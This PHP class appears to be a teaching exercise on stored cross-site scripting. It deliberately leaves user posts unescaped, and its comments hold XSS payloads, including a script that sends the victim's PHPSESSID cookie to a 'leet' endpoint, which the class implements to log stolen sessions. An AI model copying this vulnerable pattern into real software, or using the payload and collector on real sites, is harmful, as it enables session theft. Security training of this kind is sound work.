<?php

declare(strict_types=1);

namespace Epignosis\Academy\Security;

use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;

class Ex03XSS
{
    const DB_FILE_PATH = '/tmp/posts.csv';
    const DB_LEET_PATH = '/tmp/sessions.csv';

    protected $posts;
    protected $sessions;

    function __construct()
    {
        session_start();

        $this->loadPosts();
    }

    protected function loadPosts()
    {
        if (!file_exists(self::DB_FILE_PATH)) {
            touch(self::DB_FILE_PATH);
        }

        $contents = file_get_contents(self::DB_FILE_PATH);
        $lines = explode(PHP_EOL, $contents); // Break rows

        $this->posts = array();

        foreach ($lines as $line) {
            if (strlen($line) == 0) {
                continue;
            }

            $this->posts[] = base64_decode($line);
        }
    }

    public function leet(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        if (!file_exists(self::DB_LEET_PATH)) {
            touch(self::DB_LEET_PATH);
        }

        // Send CORS headers:
        // Access-Control-Allow-Origin: *
        // Access-Control-Allow-Methods: *

        // Can we hack the hacker?
        $data = $request->getParsedBody();

        file_put_contents(self::DB_LEET_PATH, $data['session'][0].PHP_EOL, FILE_APPEND);

        return $response->withStatus(204);
    }

    public function add(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        // How to prevent XSS?
        // <script>alert('ok')</script>
        // <script>alert(document.cookie.match(/PHPSESSID=[^;]+/))</script>

        /*
        <script>
        var request = new XMLHttpRequest();
        request.open('POST', 'http://localhost:8000/ex03/leet', true);
        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
        request.send(JSON.stringify({ 'session': document.cookie.match(/PHPSESSID=[^;]+/) }));
        </script>
        */

        // $post = htmlspecialchars($_POST['body'], ENT_QUOTES, 'UTF-8');
        // http://htmlpurifier.org/comparison

        $post = $_POST['body'];

        file_put_contents(self::DB_FILE_PATH, base64_encode($post).PHP_EOL, FILE_APPEND);

        return Helper::redirect($response, '/ex03/');
    }

    public function home(ServerRequestInterface $request, ResponseInterface $response, array $args): ResponseInterface
    {
        $counter = 1;
        $rows = '';
        foreach ($this->posts as $post){
            $rows .= <<<EOT
    <tr>
      <th scope="row">{$counter}</th>
      <td>{$post}</td>
    </tr>
EOT;
            $counter++;
        }

        $content = <<<EOT
<div class="alert alert-success" role="alert">
  Legitimate use of the App
</div>
<form method="post" action="add">
  <div class="mb-3">
    <label for="exampleFormControlTextarea1" class="form-label">Example textarea</label>
    <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" name="body"></textarea>
  </div>
  <button type="submit" class="btn btn-primary" style="margin-top: 10px;"><i class="bi-plus"></i> Post</button>
</form>
<table class="table" style="margin-top: 20px;">
  <thead>
    <tr>
      <th scope="col">#</th>
      <th scope="col">Post</th>
    </tr>
  </thead>
  <tbody>
  {$rows}
  </tbody>
</table>
EOT;

        $response->getBody()->write($content);
        return $response;
    }
}